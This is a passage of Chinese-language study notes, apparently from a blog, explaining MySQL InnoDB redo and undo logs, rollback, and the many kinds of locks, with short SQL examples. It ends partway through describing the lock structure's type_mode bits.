<li>innodb_log_files_in_group：指明redo log file的个数，命名方式如：ib_logfile0，iblogfile1…iblogfilen。默认2个，最大100个。</li>
<li>innodb_flush_log_at_trx_commit：控制 redo log 刷新到磁盘的策略，默认为1。</li>
<li>innodb_log_file_size：单个 redo log 文件设置大小，默认值为 48M 。最大值为512G，注意最大值指的是整个 redo log 系列文件之和，即（innodb_log_files_in_group * innodb_log_file_size ）不能大于最大值512G</li>
</ul>
<p>文件是重复利用的，对于已经刷新到磁盘的修改数据，其日志可以删除，使用两个变量记录：</p>
<p>write pos: 当前记录位置，一边写一边后移</p>
<p>checkpoint: 当前要擦除的位置，同样向后推移</p>
<h3 id="UNDO-日志-原子性的保证"><a href="#UNDO-日志-原子性的保证" class="headerlink" title="UNDO 日志 原子性的保证"></a>UNDO 日志 原子性的保证</h3><p>UNDO日志确保事务的原子性，在事务中<code>更新数据前</code>（查询数据不需要）需要先写入一个<code>undo log</code>。</p>
<p><strong>UNDO日志的作用：</strong></p>
<ol>
<li>回滚数据：需要注意的是，UNDO是逻辑日志，因此只是将数据库逻辑上恢复到原来的样子，而不是物理意义上。比如说删除数据后执行回滚操作，则是在新的物理空间插入数据，而不是恢复原来存储空间的数据。</li>
<li>MVCC：</li>
</ol>
<h4 id="UNDO日志的存储结构"><a href="#UNDO日志的存储结构" class="headerlink" title="UNDO日志的存储结构"></a>UNDO日志的存储结构</h4><ol>
<li><p>回滚段和undo页：innodb采用段式存储，每个段存储1024个undo log segment，在每个中进行undo页的申请</p>
<ul>
<li>在 InnoDB1.1版本之前 （不包括1.1版本），只有一个rollback segment，因此支持同时在线的事务限制为 1024 。虽然对绝大多数的应用来说都已经够用。</li>
<li>从1.1版本开始InnoDB支持最大 128个rollback segment ，故其支持同时在线的事务限制提高到了 128*1024 。</li>
</ul>
</li>
<li><p>回滚段与事务</p>
<ol>
<li>每个事务只会使用一个回滚段，一个回滚段在同一时刻可能会服务于多个事务。</li>
<li>当一个事务开始的时候，会制定一个回滚段，在事务进行的过程中，当数据被修改时，原始的数据会被复制到回滚段。</li>
<li>在回滚段中，事务会不断填充盘区，直到事务结束或所有的空间被用完。如果当前的盘区不够用，事务会在段中请求扩展下一个盘区，如果所有已分配的盘区都被用完，事务会覆盖最初的盘区或者在回滚段允许的情况下扩展新的盘区来使用。</li>
<li>回滚段存在于undo表空间中，在数据库中可以存在多个undo表空间，但同一时刻只能使用一个undo表空间。</li>
<li>当事务提交时，InnoDB存储引擎会做以下两件事情：<ol>
<li>将undo log放入列表中，以供之后的purge操作</li>
<li>判断undo log所在的页是否可以重用，若可以分配给下个事务使用</li>
</ol>
</li>
</ol>
</li>
<li><p>回滚段中的数据分类</p>
<ol>
<li>未提交的回滚数据(uncommitted undo information)</li>
<li>已经提交但未过期的回滚数据(committed undo information)：事务提交后不能马上清理，因为可能有其他事务正在获取事务提交前的数据。</li>
<li>事务已经提交并过期的数据(expired undo information)</li>
</ol>
</li>
</ol>
<p>UNDO页是可以被重用的，当事务提交时，并不会立即删除undo页，因为此页可能混杂着其他事务的undo log。事务提交后，其对应的undo页，如果使用小于3&#x2F;4时，其他事务可以重用。</p>
<h4 id="UNDO的类型"><a href="#UNDO的类型" class="headerlink" title="UNDO的类型"></a>UNDO的类型</h4><p>在InnoDB存储引擎中，undo log分为：</p>
<ul>
<li>insert undo log：insert操作产生的log，因为此操作仅对当前事务可见，其他事务在当前事务提交前是不可能意识到有这条数据存在的，所以当前事务提交后可以立即删除。</li>
<li>update undo log：delete和update产生的log，不能立即删除，避免不可重复读</li>
</ul>
<h4 id="UNDO-LOG的生命周期"><a href="#UNDO-LOG的生命周期" class="headerlink" title="UNDO LOG的生命周期"></a>UNDO LOG的生命周期</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241201230142.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241201230154.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241201230418.png"></p>
<p>假如我们进行以下操作，其对应undo log的生成过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin;</span><br><span class="line">INSERT INTO user (name) VALUES (&quot;tom&quot;);</span><br><span class="line">-- 生成一条insert log，包含了log序号0、插入主键的列和值，并且数据回滚指针DB_ROLL_PTR会指向它。</span><br><span class="line">UPDATE user SET name = &quot;SUM&quot; WHERE id=1;</span><br><span class="line">-- 生成一条update log，序号1，数据回滚指针DB_ROLL_PTR会指向它，然后 它的指针指向上面生成的insert log</span><br><span class="line">UPDATE user SET id=2 WHERE id=1;</span><br><span class="line">-- 更新主键时的操作会有所不同，会生成两条log，首先将原先数据对应的行记录中的daletemark标识打开，表示此条数据被删除，生成update log，并且序号为2；然后重新插入一条id为2的数据，同时生成update log，并且序号为3（同一个事务产生的log序号依次递增）</span><br></pre></td></tr></table></figure>



<h4 id="UNDO-LOG如何实现回滚"><a href="#UNDO-LOG如何实现回滚" class="headerlink" title="UNDO LOG如何实现回滚"></a>UNDO LOG如何实现回滚</h4><p>以上面的例子来说，假设执行rollback，那么对应的流程应该是这样：</p>
<ol>
<li>通过undo no&#x3D;3的日志把id&#x3D;2的数据删除</li>
<li>通过undo no&#x3D;2的日志把id&#x3D;1的数据的deletemark还原成0</li>
<li>通过undo no&#x3D;1的日志把id&#x3D;1的数据的name还原成Tom</li>
<li>通过undo no&#x3D;0的日志把id&#x3D;1的数据删除</li>
</ol>
<h2 id="锁-隔离性的保证"><a href="#锁-隔离性的保证" class="headerlink" title="锁 隔离性的保证"></a>锁 隔离性的保证</h2><h3 id="MySQL并发事务访问相同的记录"><a href="#MySQL并发事务访问相同的记录" class="headerlink" title="MySQL并发事务访问相同的记录"></a>MySQL并发事务访问相同的记录</h3><p>可以分为三种情况：</p>
<ol>
<li><code>读-读</code>：不会出现并发问题。</li>
<li><code>写-写</code>：脏写问题。此时要求事务<code>排队执行</code>写操作，这个排队过程通过锁机制实现，这其实是一种内存中的结构，事务在执行前是没有锁结构和记录进行关联的。当事务修改某条记录时，会在内存中查找与本记录相关的<code>锁结构</code>。如果没有找到，会生成一个锁结构与之对应。锁结构包含了事务信息和等待标识符，每个事务会生成一个锁结构，当前执行的事务修改完毕后，会在内存查找同一个记录的锁结构，并标记等待为false，唤醒其对应事务的线程执行。</li>
<li><code>读-写</code>：可能出现脏读，不可重复读，幻读问题。</li>
</ol>
<h3 id="并发问题的解决方案"><a href="#并发问题的解决方案" class="headerlink" title="并发问题的解决方案"></a>并发问题的解决方案</h3><p>主要有两种方案：</p>
<ol>
<li><p>读操作利用多版本并发控制（<code>MVCC</code>），写操作进行<code>加锁</code>。</p>
<blockquote>
<p>生成一个ReadView，记录所有已经提交的事务所做的更改。</p>
<p>在 READ COMMITTED 下，事务每次执行select时都会生成一个readview，从而可以避免脏读</p>
<p>在 REPEATABLE READ 下，事务仅在第一次select时生成一个readview，从而可以避免不可重复读和幻读</p>
</blockquote>
</li>
<li><p>读写都采用<code>加锁</code>的方式。<strong>会增加开销</strong>，适用于不允许读取记录的旧版本，只能读取记录的最新版本的业务场景，如银行存取款，必须等扣款后才读。可能出现幻读问题，因为插入的新纪录找不到对应的锁结构。采用临界锁解决</p>
</li>
</ol>
<h3 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h3><h4 id="从数据操作的类型分：共享（读）、排他（写）锁"><a href="#从数据操作的类型分：共享（读）、排他（写）锁" class="headerlink" title="从数据操作的类型分：共享（读）、排他（写）锁"></a>从数据操作的类型分：共享（读）、排他（写）锁</h4><ol>
<li><p><code>读锁 </code>：也称为 <code>共享锁</code> 、英文用 S 表示。针对同一份数据，多个事务的读操作可以同时进行而不会互相影响，相互不阻塞的。<strong>读加共享锁</strong></p>
</li>
<li><p><code>写锁 </code>：也称为 <code>排他锁</code> 、英文用 X 表示。当前写操作没有完成前，它会阻断其他写锁和读锁。这样就能确保在给定的时间里，只有一个事务能执行写入，并防止其他用户读取正在写入的同一资源。<strong>读写均可加排它锁</strong></p>
</li>
</ol>
<p>Innodb支持表级和行级的读写锁，读写锁兼容如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>X</th>
<th>S</th>
</tr>
</thead>
<tbody><tr>
<td>X</td>
<td>NO</td>
<td>NO</td>
</tr>
<tr>
<td>S</td>
<td>NO</td>
<td>兼容</td>
</tr>
</tbody></table>
<p><strong>加锁的方式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 对读取的记录加行级共享锁</span><br><span class="line">select ... lock in share mode;</span><br><span class="line">-- or 8.0以后</span><br><span class="line">select ... for share</span><br><span class="line"></span><br><span class="line">-- 对读取的记录加行级排他锁</span><br><span class="line">select ... for update；</span><br></pre></td></tr></table></figure>

<p>在8.0之前，如果一直获取不到锁，就会等待直到innodb_lock_wait_timeout超时。8.0后可以设置参数：</p>
<ul>
<li><code>NOWAIT</code>：若记录行已经加锁，立即报错返回。</li>
<li><code>STOP LOCKED</code>：立即返回，但结果中不包含被锁定的行</li>
</ul>
<h4 id="从数据操作的粒度：表级锁，页级锁，行锁"><a href="#从数据操作的粒度：表级锁，页级锁，行锁" class="headerlink" title="从数据操作的粒度：表级锁，页级锁，行锁"></a>从数据操作的粒度：表级锁，页级锁，行锁</h4><h5 id="表锁"><a href="#表锁" class="headerlink" title="表锁"></a><strong>表锁</strong></h5><p>不依赖存储引擎，开销最小，可以避免死锁，并发效率最差。一般情况下innodb不会使用表级锁，仅在一些特殊情况下，如崩溃恢复等才可能使用。</p>
<h6 id="表级s-x锁"><a href="#表级s-x锁" class="headerlink" title="表级s,x锁"></a>表级s,x锁</h6><p>在系统变量autocommit&#x3D;0,innodb_table_locks&#x3D;1时，手动获取innodb存储引擎提供的表t的S锁或x锁如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lock table t read;</span><br><span class="line">lock table t write;</span><br><span class="line">-- 解锁:</span><br><span class="line">unlock tables;</span><br></pre></td></tr></table></figure>

<p><strong>加锁的影响</strong>：</p>
<table>
<thead>
<tr>
<th>锁类型</th>
<th>自己读</th>
<th>自己写</th>
<th>自己操作其他表</th>
<th>他人读</th>
<th>他人写</th>
</tr>
</thead>
<tbody><tr>
<td>读锁</td>
<td>Y</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>N，等待</td>
</tr>
<tr>
<td>写锁</td>
<td>Y</td>
<td>Y</td>
<td>N</td>
<td>N，等待</td>
<td>N，等待</td>
</tr>
</tbody></table>
<h6 id="表级意向锁"><a href="#表级意向锁" class="headerlink" title="表级意向锁"></a>表级意向锁</h6><p>innoDB 支持<code>多粒度锁</code>（multiple granularity locking） ，它允许<code>行级锁</code>与<code>表级锁</code>共存，而意向锁就是其中的一种<code>表锁</code>。意向锁可以避免在为表添加表级读写锁的时候需要遍历表中各页、行是否存在页级锁和行级锁，分为两种：</p>
<ul>
<li>意向共享锁（intention shared lock, IS）：事务有意向对表中的某些行加共享锁（S锁）</li>
<li>意向排他锁（intention exclusive lock, IX）：事务有意向对表中的某些行加排他锁（X锁）</li>
</ul>
<p>即：意向锁是由存储引擎自己维护的 ，用户无法手动操作意向锁，在为数据行加共享&#x2F;排他锁之前，InooDB 会先获取该数据行所在数据表的对应意向锁 </p>
<p>意向读写锁之间是兼容的，除意向共享锁和共享锁外，意向读写锁和普通读写锁均不兼容</p>
<h6 id="自增锁"><a href="#自增锁" class="headerlink" title="自增锁"></a>自增锁</h6><p>保证多个事务同时插入数据时自增字段递增顺序，是对整个表的锁定。拥有自增字段的表在插入时可以分为三种：</p>
<ol>
<li>简单插入：可以预先确定插入行数的</li>
<li>批量插入：实现不知道插入行数的</li>
<li>混合插入：在简单插入的基础上，指定了部分行数据的自增值</li>
</ol>
<p><code>innodb_autoinc_lock_mode</code>参数可以控制InnoDB表的自增长字段生成策略，它有三种设置值：</p>
<ol>
<li><strong>传统模式（innodb_autoinc_lock_mode&#x3D;0）</strong>：<ul>
<li>在此模式下，InnoDB使用<code>表级锁</code>来保护自增值的生成。这意味着在插入语句开始时，InnoDB会对整个表加锁，直到语句结束时才释放锁。</li>
<li>这种模式确保每次插入都严格按照顺序生成自增值，但会导致<code>并发性能下降</code>，因为其他事务在锁释放之前必须等待。</li>
</ul>
</li>
<li><strong>连续模式（innodb_autoinc_lock_mode&#x3D;1）</strong>：<ul>
<li>在此模式下，InnoDB主要使用<code>互斥锁</code>来保护自增值的生成。互斥锁的开销比表级锁小得多，因此可以显著<code>提高并发</code>性能。</li>
<li>对于简单插入（simple inserts），InnoDB使用MUTEX机制来生成自增值。而对于批量插入（bulk inserts），InnoDB可能仍然使用AUTO-INC LOCKING机制来确保自增值的连续性。</li>
<li>通常情况下，将此参数设置为1可以在安全性和性能之间取得良好的平衡。</li>
</ul>
</li>
<li><strong>交错模式（innodb_autoinc_lock_mode&#x3D;2）</strong>：<ul>
<li>在此模式下，InnoDB允许批量插入操作预先分配自增值，而不使用锁机制。每个事务在开始插入时获得一组连续的自增值，即使事务中途回滚或失败，这些自增值也不会回退。</li>
<li>这种模式在并发批量插入时具有<code>最佳性能</code>，但<code>可能会导致自增值不连续</code>。因此，在需要自增值连续性的场景中，应谨慎使用此模式。</li>
</ul>
</li>
</ol>
<h6 id="元数据锁"><a href="#元数据锁" class="headerlink" title="元数据锁"></a>元数据锁</h6><p>MySQL5.5引入了meta data lock，简称MDL锁，属于表锁范畴。MDL的作用是，保证读写的正确性。比如，如果一个查询正在遍历一个表中的数据，而执行期间另一个线程对这个 <code>表结构做变更</code> ，增加了一列，那么查询线程拿到的结果跟表结构对不上，肯定是不行的。<br>因此，当对一个表做增删改查操作的时候，加 MDL读锁；当要对表做结构变更操作的时候，加 MDL 写锁，<strong>元数据锁是搜索引擎自动生成的</strong></p>
<h5 id="页锁："><a href="#页锁：" class="headerlink" title="页锁："></a>页锁：</h5><p>锁就是在 页的粒度 上进行锁定，锁定的数据资源比行锁要多，因为一个页中可以有多个行记录。当我们使用页锁的时候，会出现数据浪费的现象，但这样的浪费最多也就是一个页上的数据行。页锁的开销介于表锁和行锁之间，会出现死锁。锁定粒度介于表锁和行锁之间，并发度一般。每个层级的锁数量是有限制的，因为锁会占用内存空间， 锁空间的大小是有限的 。当某个层级的锁数量超过了这个层级的阈值时，就会进行 锁升级 。锁升级就是用更大粒度的锁替代多个更小粒度的锁，比如InnoDB 中行锁升级为表锁，这样做的好处是占用的锁空间降低了，但同时数据的并发度也下降了。页锁也可能会导致死锁。</p>
<h5 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h5><p>innoDB支持，myISAM不支持。行级锁在服务层无法实现，仅在存储引擎层实现。</p>
<p><strong>优点：</strong>锁定力度小，发生锁冲突概率低，并发度高</p>
<p><strong>缺点：</strong>开销大，加锁慢，容易死锁。</p>
<h6 id="记录锁"><a href="#记录锁" class="headerlink" title="记录锁"></a>记录锁</h6><p>记录锁是有S锁和X锁之分的，称之为 S型记录锁 和 X型记录锁 。</p>
<ul>
<li>当一个事务获取了一条记录的S型记录锁后，其他事务也可以继续获取该记录的S型记录锁，但不可以继续获取X型记录锁；</li>
<li>当一个事务获取了一条记录的X型记录锁后，其他事务既不可以继续获取该记录的S型记录锁，也不可以继续获取X型记录锁。</li>
</ul>
<h6 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h6><p>间隙锁主要<strong>用于解决幻读问题</strong>，确保在同一个事务中多次执行相同的范围查询时，查询结果集保持一致，避免由于其他事务的插入操作导致新记录未被加锁的情况。这种锁机制锁定的是两个索引记录之间的间隙，或者锁定的是第一个索引记录之前的间隙以及最后一个索引记录之后的间隙。与直接锁定具体记录的行锁不同，间隙锁<strong>锁定的是记录之间的空间，即索引记录之间的间隙。</strong></p>
<p>间隙锁的锁定范围是根据查询条件和索引来确定的。当事务执行范围查询并使用<code>FOR UPDATE</code>或<code>LOCK IN SHARE MODE</code>时，InnoDB存储引擎会自动在查询范围内的索引记录之间的间隙上添加间隙锁。这种锁定方式确保了在这个范围内不会有新的记录被插入，从而避免了幻读问题的发生。间隙锁是<strong>自动添加</strong>的，无需显式地通过SQL语句来指定。在<strong>可重复读（Repeatable Read）隔离级别下</strong>，当事务进行查询并添加行级读写锁时，InnoDB会自动添加间隙锁。此外，间隙锁不影响读取操作，仅影响在锁定范围内插入数据的能力。间隙锁也<strong>可能导致死锁</strong>的发生。当多个事务相互等待对方释放间隙锁时，就可能形成死锁。因此，在使用间隙锁时，需要权衡其防止幻读的能力和对并发性能的影响，以及可能引发的死锁问题。</p>
<h6 id="临键锁"><a href="#临键锁" class="headerlink" title="临键锁"></a>临键锁</h6><p>临键锁（Next-Key Lock）主要用于解决并发控制中的数据一致性问题，特别是幻读（Phantom Read）问题。临键锁是对索引记录及其相邻间隙（gap）进行锁定的一种锁机制。它实际上是由间隙锁（Gap Lock）和记录锁（Record Lock）组合而成的。临键锁的设计目的是为了在并发环境中，确保数据的一致性和完整性。临键锁的锁定范围为：记录+区间（左开右闭），即不锁住左边的记录，但锁住右边的记录以及该记录与下一个记录之间的间隙。这种锁定方式使得在并发插入或更新操作时，能够避免数据冲突和幻读现象。临键锁能够保证在并发情况下，不会出现两个事务同时插入相同索引记录的情况。可以有效避免幻读问题，即一个事务在读取某些行后，另一个事务插入新行，然后第一个事务再次读取同样的范围时，看到了这些新的“幻影”行。临键锁只与非唯一索引列有关，在唯一索引列上不存在临键锁。同一个事务不能同时拥有临键锁和间隙锁，避免了死锁的可能性。当使用临键锁时，需要注意事务的隔离级别和锁定的持续时间，以避免对系统性能造成不必要的影响。</p>
<h6 id="意向插入锁"><a href="#意向插入锁" class="headerlink" title="意向插入锁"></a>意向插入锁</h6><p>意向插入锁（Insert Intention Lock），也称为插入意向锁，是在执行INSERT操作之前设置的一种间隙锁，它表示了一种插入意图。当多个不同的事务同时往同一个索引的同一个间隙中插入数据时，如果它们插入的位置不同，则这些事务可以互相之间无需等待，即不会相互阻塞。这种锁机制提高了数据插入的效率，特别是在高并发插入场景下。<strong>意向插入锁是一种特殊的间隙锁</strong>，它锁定了两个记录之间的间隙，而不是记录本身。它允许在同一间隙内插入多个不同的数据行，而不会相互冲突。在<strong>可重复读</strong>（REPEATABLE READ）隔离级别下，意向插入锁与其他插入<strong>意向锁是兼容的</strong>，但<strong>与排他锁互斥</strong>。意向插入锁<strong>只会与间隙锁或Next-Key锁冲突</strong>，因为这些锁也锁定了相同的间隙。意向插入锁是在InnoDB存储引擎中自<strong>动添加的</strong>，不需要用户手动干预。在使用意向插入锁时，需要注意事务的隔离级别和锁定的持续时间，以避免对系统性能造成不必要的影响。如果出现锁冲突或死锁情况，InnoDB存储引擎会自动进行锁等待和死锁检测，以确保事务的顺利执行。</p>
<h4 id="从对待锁的态度划分：乐观锁，悲观锁"><a href="#从对待锁的态度划分：乐观锁，悲观锁" class="headerlink" title="从对待锁的态度划分：乐观锁，悲观锁"></a>从对待锁的态度划分：乐观锁，悲观锁</h4><p>悲观锁和乐观锁不是一种锁机制，而<strong>是锁的一种设计思想</strong></p>
<h5 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h5><p>悲观锁是一种思想，顾名思义，就是很悲观，对数据被其他事务的修改持保守态度，会通过数据库自身的锁机制来实现，从而保证数据操作的排它性。悲观锁总是假设最坏的情况，每次去拿数据的时候<strong>都认为别人会修改</strong>，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会<code>阻塞</code>直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁，当其他线程想要访问数据时，都需要阻塞挂起。Java中 synchronized 和 ReentrantLock 等独占锁就是悲观锁思想的实现。</p>
<p><strong>悲观锁</strong>适用于：</p>
<ul>
<li>数据修改较为频繁且发生冲突的概率较高的场景。</li>
<li>需要高度保证数据一致性的场景，如银行转账、金融交易等。</li>
<li>数据更新操作较为复杂，可能需要多次修改的场景。</li>
</ul>
<h5 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h5><p>乐观锁是在程序层面实现的，在乐观锁的策略下，事务不会立即锁定数据，而是对数据进行修改前假设没有其他事务发生冲突。在提交数据时，如果发现冲突则回滚事务，反之则提交。在事务开始时，乐观锁不会加锁数据，而是进行数据的读取和修改，直到数据提交时再进行检查。检查数据是否被其他事务修改过，通常使用<strong>版本号</strong>或<strong>时间戳</strong>来判断数据是否被修改过。如果版本号或时间戳发生变化，表示数据已被修改过，当前事务需要回滚；如果没有变化，则提交事务。</p>
<p><strong>乐观锁</strong>适用于：</p>
<ul>
<li>数据读取远多于写入，且发生冲突的概率较低的场景。</li>
<li>需要较高并发性能且希望避免死锁的场景。</li>
<li>适合分布式系统中的资源访问，减少锁的竞争和网络开销。</li>
</ul>
<p><strong>实现机制</strong></p>
<ul>
<li><strong>版本号</strong>：每行记录有一个版本号，修改时检查版本号是否发生变化，如果变化则说明数据被修改，事务回滚。</li>
<li><strong>时间戳</strong>：每行记录有一个时间戳，修改时检查时间戳是否发生变化，若发生变化则事务回滚。</li>
</ul>
<h5 id="悲观锁与乐观锁的比较"><a href="#悲观锁与乐观锁的比较" class="headerlink" title="悲观锁与乐观锁的比较"></a><strong>悲观锁与乐观锁的比较</strong></h5><table>
<thead>
<tr>
<th><strong>特点</strong></th>
<th><strong>悲观锁 (Pessimistic Lock)</strong></th>
<th><strong>乐观锁 (Optimistic Lock)</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>锁定方式</strong></td>
<td>提前加锁，假设会发生冲突，防止其他事务访问</td>
<td>不加锁，假设没有冲突，修改前后验证是否发生冲突</td>
</tr>
<tr>
<td><strong>事务冲突检测</strong></td>
<td>通过加锁实现，事务完成后锁被释放</td>
<td>提交时通过版本号或时间戳等方式检查冲突</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>数据<code>写入</code>较多，冲突概率较高，确保数据一致性</td>
<td>数据<code>读取</code>较多，冲突较少，减少资源的争夺和性能损耗</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>可能会造成死锁或性能瓶颈，特别在并发高时</td>
<td>性能较好，特别是在读多写少的场景中</td>
</tr>
<tr>
<td><strong>资源占用</strong></td>
<td>锁住资源，可能导致锁竞争和死锁</td>
<td>无需锁资源，避免了资源的竞争</td>
</tr>
<tr>
<td><strong>事务处理方式</strong></td>
<td>在操作时直接锁住数据，直到事务结束才释放锁</td>
<td>在提交时检查冲突，如果有冲突就回滚事务</td>
</tr>
<tr>
<td><strong>常见技术</strong></td>
<td>行级锁、表级锁（例如 <code>SELECT FOR UPDATE</code>）</td>
<td>版本号控制、时间戳控制、CAS（Compare And Swap）</td>
</tr>
</tbody></table>
<h4 id="按加锁的方式划分：显式锁，隐式锁"><a href="#按加锁的方式划分：显式锁，隐式锁" class="headerlink" title="按加锁的方式划分：显式锁，隐式锁"></a>按加锁的方式划分：显式锁，隐式锁</h4><p>看不懂现在。<a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=180">显式锁和隐式锁</a></p>
<h5 id="隐式锁"><a href="#隐式锁" class="headerlink" title="隐式锁"></a>隐式锁</h5><h5 id="显式锁"><a href="#显式锁" class="headerlink" title="显式锁"></a>显式锁</h5><h5 id="隐式锁与显式锁的比较"><a href="#隐式锁与显式锁的比较" class="headerlink" title="隐式锁与显式锁的比较"></a><strong>隐式锁与显式锁的比较</strong></h5><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>隐式锁</strong></th>
<th><strong>显式锁</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>定义</strong></td>
<td>自动由数据库系统管理，开发者无需显式操作</td>
<td>由开发者或数据库用户显式指定和控制</td>
</tr>
<tr>
<td><strong>粒度</strong></td>
<td>通常由数据库自动决定，可能是行级锁或表级锁</td>
<td>用户可以精确控制锁的粒度（行级锁、表级锁等）</td>
</tr>
<tr>
<td><strong>使用场景</strong></td>
<td>数据库系统在执行操作时自动加锁，保证数据一致性</td>
<td>在复杂的并发控制场景中，开发者手动加锁控制</td>
</tr>
<tr>
<td><strong>锁释放</strong></td>
<td>由数据库自动管理，通常在事务提交或回滚时释放</td>
<td>由开发者显式管理，需要手动释放锁</td>
</tr>
<tr>
<td><strong>优点</strong></td>
<td>简单、透明，减少开发复杂度</td>
<td>提供更高的灵活性和控制力</td>
</tr>
<tr>
<td><strong>缺点</strong></td>
<td>灵活性差，可能导致不必要的锁等待或性能瓶颈</td>
<td>开发者需负责加锁和解锁，容易出错</td>
</tr>
</tbody></table>
<h4 id="其他锁：全局锁、死锁"><a href="#其他锁：全局锁、死锁" class="headerlink" title="其他锁：全局锁、死锁"></a>其他锁：全局锁、死锁</h4><h5 id="全局锁"><a href="#全局锁" class="headerlink" title="全局锁"></a>全局锁</h5><p>对<code>整个数据库实例加锁</code>，会使得整个数据库处在只读状态，其他线程的数据库更新语句，数据定义语句和更新类事务的提交语句均会被阻塞，仅有查询语句可以被执行，常用于数据库<code>全库逻辑备份</code>时。</p>
<h5 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h5><p>两个及以上事务都持有对方需要的锁，并且都在等待对方释放，且双方均不会释放自己的锁。</p>
<p><strong>死锁的解决方案</strong></p>
<ol>
<li>等待超时后全部回滚</li>
<li>死锁检测机制：当MySQL检测到死锁时，MySQL会回滚一个事务来打破死锁，解除锁的竞争。一般会选择undo回滚<strong>最小的事务</strong>，即<strong>锁定资源较少</strong>或者<strong>持有锁时间较短</strong>的事务。(当系统变量innodb_deadlock_detect&#x3D;pn时才可以)</li>
</ol>
<p>如果你能确保这个业务一定不会出现死锁，可以临时把死锁检测关掉。当出现大量事务死锁时，死锁检测可能造成大量开销，因此应当控制并发访问的数量，在中间件中实现对相同行的更新，在进入引擎前就排队。</p>
<h6 id="死锁避免"><a href="#死锁避免" class="headerlink" title="死锁避免"></a>死锁避免</h6><ol>
<li>合理设计索引，使业务 SQL尽可能通过索引定位更少的行，减少锁竞争。</li>
<li>调整业务逻辑 SQL 执行顺序，避免 update&#x2F;delete 长时间持有锁的 SQL 在事务前面。</li>
<li>避免大事务，尽量将大事务拆成多个小事务来处理，小事务缩短锁定资源的时间，发生锁冲突的几率也更<br> 小。</li>
<li>在并发比较高的系统中，不要显式加锁，特别是是在事务里显式加锁。如select .for update 语句，如果是在事务里运行了 start transaction 或设置了autocommit 等于0，那么就会锁定所査找到的记录。</li>
<li>降低隔离级别。如果业务允许，将隔离级别调低也是较好的选择，比如将隔离级别从RR调整为RC，可以避免掉很多因为gap锁造成的死锁。</li>
</ol>
<h3 id="锁的内存结构"><a href="#锁的内存结构" class="headerlink" title="锁的内存结构"></a>锁的内存结构</h3><p>MySQL中为了避免创建过多的锁结构，一般满足以下条件的记录加锁时会记录在同一个锁结构：</p>
<ul>
<li>在<strong>同一个事务中</strong>进行加锁操作</li>
<li>被加锁的记录在<strong>同一个页面</strong>中</li>
<li>加锁的<strong>类型是一样</strong>的</li>
<li><strong>等待状态是一样的</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241207195341.png"></p>
<p><strong>结构解析：</strong></p>
<ol>
<li><p><strong>锁所在的事务信息</strong> ：不论是表锁还是行锁，都是在事务执行过程中生成的，哪个事务生成了这个锁结构，这里就记录这个事务的信息。此锁所在的事务信息在内存结构中<code>只是一个指针</code>，通过指针可以找到内存中关于该事务的更多信息，比方说事务id等。</p>
</li>
<li><p><strong>索引信息</strong>：对于行锁来说，需要记录一下加锁的记录是属于哪个索引的。这里也<code>是一个指针</code>。</p>
</li>
<li><p><strong>表锁&#x2F;行锁信息：</strong>表锁结构和行锁结构在这个位置的内容是不同的：</p>
</li>
<li><p><strong>表锁：</strong>记载着是对哪个表加的锁，还有其他的一些信息。</p>
</li>
<li><p><strong>行锁：</strong>记载了三个重要的信息：</p>
<ul>
<li>SpaceID：记录所在表空间。</li>
<li>PageNumber：记录所在页号。</li>
<li>n_bits：对于行锁来说，一条记录就对应着一个比特位，一个页面中包含很多记录，用不同的比特位来区分到底是哪一条记录加了锁。为此在行锁结构的末尾放置了一堆比特位，这n_bits属性<strong>代表使用了多少比特位。</strong></li>
</ul>
</li>
<li><p><strong>type_mode ：</strong>这是一个32位的数，被分成了 lock_mode 、 lock_type 和 rec_lock_type 三个部分</p>
</li>
</ol>
<p>  <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241207201301.png"></p>
<ol>
<li>锁的模式（ lock_mode ），占用低4位。在InnoDB存储引擎中，LOCK_IS，LOCK_IX，LOCK_AUTO_INC都算是表级锁的模式，LOCK_S和LOCK_X既可以算是表级锁的模式，也可以是行级锁的模式。可选的值如下：</li>
</ol>
<pre><code>+ LOCK_IS （十进制的 0 ）：表示共享意向锁，也就是 IS锁 。
+ LOCK_IX （十进制的 1 ）：表示独占意向锁，也就是 IX锁 。
+ LOCK_S （十进制的 2 ）：表示共享锁，也就是 S锁 。
    LOCK_X （十进制的 3 ）：表示独占锁，也就是 X锁 。
+ LOCK_AUTO_INC （十进制的 4 ）：表示 AUTO-INC锁 。
</code></pre>
<ol start="2">
<li><p>锁的类型（ lock_type ），占用第5～8位，不过现阶段只有第5位和第6位被使用：</p>
<ul>
<li>LOCK_TABLE （十进制的 16 ），也就是当第5个比特位置为1时，表示表级锁。</li>
<li>LOCK_REC （十进制的 32 ），也就是当第6个比特位置为1时，表示行级锁。</li>
</ul>
</li>
